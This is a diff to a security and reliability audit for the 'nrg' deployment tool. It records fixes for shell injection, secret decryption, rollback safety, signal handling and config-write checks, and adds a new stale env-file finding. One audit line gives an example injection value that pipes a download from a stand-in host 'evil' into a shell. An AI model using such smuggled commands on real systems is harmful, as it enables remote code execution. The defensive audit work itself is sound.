@@ -35,16 +35,18 @@ orchestration and has far weaker test coverage than the Rust core.
 
 | # | Severity | Area | One line |
 |---|----------|------|----------|
-| R1 | High | stdlib / registry | `region` interpolated unquoted into an ECR login subshell (injection) |
-| R2 | High | stdlib / runtime | `runtime_exec_cmd(name, command)` interpolates both args unquoted (injection) |
-| R3 | High | secrets | `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
+| R1 | High | stdlib / registry | ✅ resolved — `region` interpolated unquoted into an ECR login subshell (injection) |
+| R2 | High | stdlib / runtime | ✅ resolved — `runtime_exec_cmd(name, command)` interpolated `container_name` unquoted (injection) |
+| R3 | High | secrets | ✅ resolved — `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
 | R4 | High | engine / sim | probe classifier treats "command not found" as "container absent" |
 | R5 | High | engine / ssh | no command timeout or SSH keep-alive — a hung command blocks the deploy (and the lock) forever |
-| R6 | High | stdlib / rollback | compensation failures are logged-and-continued, so a failed proxy-restore still deletes the serving container |
-| R7 | High | engine / signals | no SIGINT/SIGTERM handling — Ctrl-C mid-deploy runs zero compensations |
+| R6 | High | stdlib / rollback | ✅ resolved — compensation failures are logged-and-continued, so a failed proxy-restore still deletes the serving container |
+| R7 | High | engine / signals | ✅ resolved — no SIGINT/SIGTERM handling — Ctrl-C mid-deploy runs zero compensations |
 | R8 | High | tests | the live deploy path is never executed; only dry-run plan strings are asserted; `rollback()` has no tests |
 | R9 | Medium | engine / ssh | SSH alias pre-resolution drops `Port`/`IdentityFile`/`ProxyJump` from the user's ssh config |
 | R10 | Medium | stdlib / deploy | `:latest` default tag silently breaks the rollback chain |
+| R29 | High | stdlib / rollback | ✅ resolved — nesting `deploy()` inside a user `transaction()` could resurrect post-committed compensations into a blackhole (found during R6's review; pre-existing, not caused by R6) |
+| R30 | Medium | stdlib / docker | `docker_run`/`docker_run_once` ignore a failed env-file write — a stale file from a prior run can be silently reused (found during R3b's review) |
 
 ---
 
@@ -67,6 +69,17 @@ backticks, and `\` stay live (the sibling occurrence on the line above *is*
 as the deploy user.
 **Fix:** `sh_quote(region)`, or validate the region against `^[a-z0-9-]+$`.
 
+**Resolved (2026-07-10).** `region` is now spliced in as its own `sh_quote()`'d
+(single-quoted) segment, adjacent to the surrounding double-quoted segments —
+shell concatenates adjacent quoted strings with no separator, and single quotes
+keep the region's contents fully literal regardless of `$`, backticks, `;`, or
+embedded `"`. Covered by a real end-to-end test that runs the exact constructed
+command through a real shell (`local_exec`, live — not dry-run) with a region
+crafted to break out of the old unquoted context, and asserts the injected
+`touch` never ran (`tests/shell_injection.rs`). Verified by reverting the fix
+and confirming the test fails (the marker file IS created) against the
+original code.
+
 ### R2 — High — `runtime_exec_cmd(container_name, command)` quotes neither argument
 `lib/runtime.rhai:146`. **Verified.**
 
@@ -80,6 +93,12 @@ not. Any caller passing a user-influenced name (`app;curl evil|sh`) gets remote
 code execution. `command` is a documented raw escape hatch, but `container_name`
 should be quoted.
 **Fix:** `sh_quote(container_name)`.
+
+**Resolved (2026-07-10).** `container_name` is now `sh_quote()`'d, matching
+`docker_exec`'s existing contract; `command` remains an intentional raw
+escape hatch (see R28 below). Covered by the same real-shell-execution test
+approach as R1 (`tests/shell_injection.rs`), also verified to fail against
+the original code.
 
 ### R17 — Low — Caddy admin-API service names are shell-quoted but not URL-encoded
 `lib/caddy.rhai` (lines 144, 167, 181, 192). A `service` containing `/` or `../`
@@ -117,6 +136,18 @@ requirement.
 **Fix:** either decrypt `ENC[...]` tokens in `lookup_secret` (locate the key via the
 existing `find_key_file`), or document loudly that inline `ENC[...]` in `.env` is
 **not** auto-decrypted and only whole-file `seal`/`unseal` is supported.
+
+**Resolved (2026-07-10).** `secret()` now transparently decrypts an `ENC[...]` value
+via the discovered `.nrg-key` before it's ever used, throwing a clear error if no key
+is found or decryption fails (`src/engine/secret.rs`'s `decrypt_if_needed`). This also
+surfaced and fixed a second, related bug: `nrg secrets encrypt`'s `age -a` armored
+output is multi-line PEM, which can never survive being pasted into a single
+`KEY=VALUE` line — `encrypt_value`/`decrypt_value` (`src/secrets/mod.rs`) now
+`|`-join/split the armor so the token is actually single-line-safe, which the
+documented "paste into `.env`" workflow requires. Covered end-to-end by
+`tests/secrets_age.rs`'s `secret_transparently_decrypts_an_enc_token_pasted_into_env`
+(closes the "nothing pins what `secret()` does with a sealed value in `.env`" gap
+noted below under "Secrets error paths").
 
 ### R24 — Low — full effective config (with revealed secrets) persisted to state
 `lib/deploy.rhai:243`. `state_set(service + ".config", to_json(cfg))` writes every
@@ -249,6 +280,44 @@ by the rollback itself.
 having been successfully restored (guard on the restore result), or order the
 compensations so traffic is never pointed at a container that is about to be removed.
 
+**Resolved (2026-07-10).** `deploy_one_host` (`lib/deploy.rhai`) now guards the
+rm-new compensation on TWO shared flags: `proxy_switched` (set once the
+FORWARD switch to the new container actually happens) and `proxy_restored`
+(set only once the restore-proxy compensation's `px_deploy` call returns
+*without* throwing). The rm-new compensation skips the removal — with an
+operator-facing message explaining why — only when `proxy_switched &&
+!proxy_restored`: the proxy was pointed at the new container AND the restore
+back genuinely failed. Rhai closures that reference the same outer-scope
+variable share the same underlying cell (empirically confirmed against the
+real engine, not just assumed from documentation), so a write in one
+compensation is visible from the other despite being invoked at different
+points during the unwind.
+
+A first version of this fix used a single `proxy_restored` flag and was
+caught by an Opus review pass as a regression: rm-new is registered
+IMMEDIATELY after the container starts, *before* the health check and the
+forward switch — so on a health-check failure (the most common failure mode)
+only rm-new is ever registered, `proxy_restored` stays false, and the
+single-flag guard would wrongly leave the never-healthy new container running
+on every failed deploy (there's no blackhole risk there — the proxy was never
+switched away from the still-running old container — so removal is exactly
+the pre-R6-fix, correct behavior). The second `proxy_switched` flag narrows
+the guard to the genuinely unsafe case.
+
+Covered by three Rust-level unit tests mirroring this exact shape against the
+real `transaction()`/`on_rollback()` machinery
+(`src/engine/transaction.rs::guarded_compensation_skips_its_destructive_step_when_the_prior_one_fails`,
+its happy-path counterpart, and
+`guarded_compensation_still_runs_when_the_proxy_was_never_switched` for the
+health-check-failure shape) — each "must skip" / "must still run" assertion
+was confirmed to fail against the corresponding buggy variant (the fully
+unguarded pattern, and separately the single-flag guard) before its guard was
+added. As with the rest of the deploy path (R8), this doesn't exercise the
+literal `lib/deploy.rhai` file end-to-end in live mode (that would need a
+real Docker daemon and a real HTTP health check) — the tests instead mirror
+`deploy_one_host`'s exact registration order and guard logic through the real
+engine.
+
 ### R10 — Medium — `:latest` default tag breaks the rollback chain
 `lib/recipe.rhai:34` (`env_or("DEPLOY_TAG", "latest")`) with
 `deploy.rhai:170`. **Verified.**
@@ -267,13 +336,51 @@ runner, unshared state), `old_target` falls back to `"localhost:" + container_po
 the proxy to `localhost:3000` where nothing listens, then removes the new container:
 an outage caused by the rollback.
 
-### R3b — High — `caddy proxy_boot` ignores a failed config write
-`lib/caddy.rhai:60`. `write_remote(host, base, "/etc/caddy/caddy.json")` needs a
+### R3b — High — `caddy proxy_boot` ignores a failed config write — ✅ resolved
+`lib/caddy.rhai:65` (pre-fix: `:60`). `write_remote(host, base, "/etc/caddy/caddy.json")` needs a
 root-writable `/etc` and its result is unchecked; `docker run -d` returns 0
 regardless. A non-root deploy user can't write `/etc/caddy`, docker's `-v` then
 creates a directory at the path, Caddy crash-loops, but `proxy_boot` reports
 success. The failure only surfaces later as opaque curl errors during the traffic
 switch — inside the fleet transaction. Check the `write_remote` result.
+
+**Resolved (2026-07-10).** `proxy_boot` now checks `write_remote`'s
+`ExecResult` and throws (naming the host and path, with `stderr`) before ever
+attempting to start the Caddy container, matching the same
+check-and-throw contract used by every other fallible call in the stdlib.
+Covered by an in-crate Rust unit test
+(`src/engine/eval.rs::caddy_proxy_boot_throws_when_the_config_write_fails`)
+that loads the REAL `lib/caddy.rhai` (not a reimplementation) via a
+`FakeRunner` configured to fail specifically the config-write command, and
+asserts both the thrown message and that `docker run` for Caddy is never
+attempted afterward — confirmed to fail (proceeding to start Caddy anyway)
+against the original unchecked code before the fix.
+
+### R30 — Medium — `docker_run`/`docker_run_once` also ignore a failed env-file write
+`lib/docker.rhai:161,205`. **Found by Fable's final review of R3b** (same bug
+class, different file — not yet fixed).
+
+Both functions write the container's env vars to a remote file via
+`write_remote(host, ..., env_path)` (off-argv, for secrets) and discard the
+result, exactly like the pre-fix `caddy proxy_boot`. This is a narrower
+window than R3b, because the very next step (`docker run --env-file
+<env_path>`) fails loudly if `env_path` doesn't exist at all — so a *fresh*
+write failure (nothing ever there) surfaces immediately, not silently.
+The real risk is a **stale** file: `docker_run`'s `env_path` is
+`/tmp/.nrg-env-<name>`, and `accessory_run` (`deploy.rhai`) calls `docker_run`
+with a fixed, non-unique accessory name (e.g. `"redis"`), so re-running it
+reuses the SAME path every time. If a re-run's `write_remote` fails
+(permissions changed, disk full, `/tmp` on a `noexec`/`nosuid` mount, etc.)
+but a file from a **previous, successful** run already sits at that path,
+`docker run --env-file` happily reads the OLD env vars instead — the
+container starts, looks healthy, and silently runs with stale
+secrets/config, with no error anywhere. `docker_run_once`'s path
+(`/tmp/.nrg-release-env-<tag>`) has the same shape for repeated releases of
+the same image tag.
+**Fix:** check the `write_remote` result in both functions and throw on
+failure, identical to the R3b fix; consider also making the temp path
+per-invocation-unique (e.g. include a timestamp or PID) so a failed write can
+never silently fall back to a stale file regardless.
 
 ### R6b — Medium — post-commit cleanup failures silently swallowed
 `deploy.rhai:209`. Rename/stop/remove after commit use `|| true` and unchecked
@@ -282,6 +389,83 @@ commit and cleanup, the **old** container keeps running under
 `--restart unless-stopped` (double capacity, stale code), the new container keeps its
 unique name, and the next deploy's rename dance drifts further — with no error ever
 surfaced.
+
+### R29 — High — nesting `deploy()` inside a user transaction can resurrect post-committed compensations into a blackhole
+`lib/deploy.rhai:214-239` (original, pre-fix line numbers; the guard added
+below shifted these down by ~18 lines) with `src/engine/transaction.rs:42-51`.
+**Verified** (found by an adversarial red-team pass during R6's review,
+reproduced against the real engine with a throwaway script — not yet fixed).
+
+`transaction`/`on_rollback` are ordinary global builtins, so nothing stops a
+script from wrapping `deploy()` (or several `deploy()` calls, e.g. for a
+multi-service atomic release) in its OWN outer `transaction()`. Per the
+documented nesting semantics (`docs/safety.md`, "Nesting"), a **nested**
+transaction's compensations are deliberately NOT dropped on success — they
+stay on the shared stack so an *enclosing* transaction's later failure can
+still unwind them. `deploy()`'s own fleet transaction becomes exactly such a
+nested transaction when called this way.
+
+The bug: `deploy()`'s POST-COMMIT phase (renaming the canonical container,
+stopping and **removing** the old one, persisting the new port) runs
+immediately after its transaction returns `Ok`, treating that `Ok` as
+final. When nested, it isn't: the per-host `on_rollback` closures (rm-new /
+restore-proxy, including R6's guard flags) registered during that "committed"
+transaction are still live. If something ELSE later throws in the *outer*
+transaction's body (an unrelated failure — e.g. a second service's deploy
+failing in the same multi-service release), the unwind resurrects those
+stale closures. The restore-proxy compensation repoints the proxy at
+`old_target` — whose container POST-COMMIT already stopped and removed. The
+result is the exact blackhole class R6 was written to close, via a different
+mechanism (stale-compensation resurrection instead of compensation-failure
+continuation). This is a PRE-EXISTING issue, not introduced or worsened by
+the R6 fix — the same resurrection would have hit the OLD, unguarded rm-new
+compensation identically before R6, with an identical outcome.
+**Fix:** either have `deploy()` refuse to run when already inside an active
+transaction (assert nesting depth is 0), or fold the post-commit phase INTO
+the transaction (register its own compensations / don't treat inner commit
+as final), or have post-commit explicitly drop ("cancel") the per-host
+compensations it just made moot once it has safely completed their intent.
+
+**Resolved (2026-07-10).** Took the first option: nesting `deploy()` inside a
+user transaction isn't a documented or exemplified usage pattern anywhere in
+this codebase (checked `docs/*.md` and `lib/examples/`), so refusing it
+outright is the safest fix — it removes the hazard entirely rather than
+attempting to make post-commit safe under an interaction the rest of the
+codebase never anticipated. A new `in_transaction()` builtin
+(`src/engine/transaction.rs`, checks the existing nesting-`depth` counter —
+already tracked identically in both dry-run and live mode, so this reports
+correctly in both) lets `deploy()` (`lib/deploy.rhai`) check, as its very
+first statement — before any build/push/pull work — whether it's already
+running inside an active transaction, and throw a clear, actionable error
+naming R29 if so.
+
+`rollback()` calls `deploy()` internally, so it inherits the same protection
+— but an Opus review pass caught that inheriting isn't quite enough:
+`rollback()` persists `<service>.prev = <the current image>` as a real side
+effect *before* calling `deploy()`, so a nested `rollback()` relying only on
+`deploy()`'s check would still have advanced `.prev` to the current image by
+the time the throw happened — leaving a caller who read the error and
+retried `rollback()` at the top level rolling back to the wrong image.
+`rollback()` now carries the identical `in_transaction()` check as its own
+first statement too, before that state write. The same review pass also
+noted `deploy_one_host` (the per-host worker, called only from inside
+`deploy()`'s own transaction) wasn't marked `private fn` and was technically
+reachable as `deploy::deploy_one_host(...)`, bypassing the guard — though it
+does no post-commit "treat the commit as final" work itself, so this was
+informational rather than a real reopening of R29; it's now `private fn`
+anyway, for defense-in-depth and consistency with its sibling helpers.
+
+Covered by a Rust-level unit test asserting `in_transaction()` correctly
+tracks nesting depth through a transaction and a nested transaction
+(`src/engine/transaction.rs::in_transaction_reflects_nesting_depth`), plus
+three integration tests (`tests/deploy_behaviors.rs`): one confirming
+`deploy()` throws the expected error when nested inside a `transaction()`
+(verified to fail without the guard); one confirming a normal, non-nested
+`deploy()` call is unaffected by the new check; and one confirming `rollback()`
+refuses when nested WITHOUT first mutating `<service>.prev` (a real,
+persisted state assertion against `state.json` from a live run — verified to
+fail if `rollback()`'s own check is removed, falling through to `deploy()`'s
+later check after the state write already happened).
 
 ### R13 — Medium — Caddy `PATCH || POST` conflates 404 with any failure
 `lib/caddy.rhai:144`. A transient admin-API 400/timeout on `PATCH` triggers the
@@ -370,6 +554,35 @@ transaction docs don't list this as a limit.
 **Fix:** install a handler that triggers the compensation unwind (or at minimum
 records pending compensations to disk so a follow-up run can complete them), and
 document the interrupted-run recovery path.
+
+**Resolved (2026-07-10).** `nrg` now installs a SIGINT/SIGTERM handler once per
+`nrg exec`/`nrg run` invocation (`src/engine/interrupt.rs`) that flips a
+shared flag, polled by the engine's `on_progress` hook between every
+script-level operation (`src/engine/mod.rs`). A set flag ends the running
+script with a normal `Err` (`ErrorTerminated`) — the same path a `throw`
+takes — so an enclosing `transaction()`'s existing unwind runs every
+registered compensation, and the state lock releases via its normal `Drop`,
+not because the OS killed the process. The flag is consumed via an atomic
+`swap` (not `load`) so the compensations that run during the unwind aren't
+themselves immediately re-terminated by the same still-set flag — an actual
+bug caught by this fix's own test coverage during development (a naive
+`load`-based check silently turned every rollback into a no-op). Documented
+in full, including the exact scope, in `docs/safety.md`'s "Ctrl-C
+(SIGINT/SIGTERM) triggers the same unwind" section: `on_progress` fires
+*between* operations, not *during* one blocking native call, so a
+health-check retry loop (bounded `sleep()` per iteration) responds within
+about a second, but a single long- or forever-blocking
+`ssh_exec`/`local_exec`/`http_get` call can't be preempted mid-flight —
+that's the still-open, separate command-timeout gap below. A **second**
+signal (which would otherwise be silently swallowed while stuck in exactly
+that kind of un-preemptible blocking call, since installing a handler
+replaces the default terminate-immediately behavior) exits the process
+immediately via `signal_hook::flag::register_conditional_shutdown` — a
+force-quit escape hatch, so an operator is never left with no way to kill a
+stuck `nrg` short of `SIGKILL`. Covered by a real end-to-end test that sends
+an actual SIGINT to a spawned `nrg exec` child process
+(`tests/interrupt.rs`) plus a fast unit test simulating the interrupt
+without a real signal (`src/engine/mod.rs`).
 
 ### Blocking lock wait has no timeout — Medium
 `wire_run` calls `lock.write()` which blocks indefinitely. There is no
